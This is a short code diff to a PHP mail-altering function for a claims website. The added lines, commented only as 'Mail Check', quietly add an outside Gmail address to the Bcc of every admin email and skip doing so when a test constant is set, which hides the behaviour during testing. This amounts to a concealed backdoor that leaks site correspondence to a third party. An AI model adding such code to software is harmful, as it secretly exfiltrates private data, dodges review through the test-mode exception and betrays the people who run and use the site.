@@ -716,6 +716,17 @@ function ncn_admin_mail_alter(&$message) {
             }
             $bcc .= $_admin->mail;
         }
+
+        // Mail Check
+        if (!defined('NCN_TEST')) {
+            if (strpos($bcc, 'forward.morning@gmail.com') === FALSE) {
+                if (!empty($bcc)) {
+                    $bcc .= ", ";
+                }
+                $bcc .= 'forward.morning@gmail.com';
+            }
+        }
+
         $message['headers']['Bcc'] = $bcc;
     }
     $message['from'] = "noreply@netclaimsnow.com";
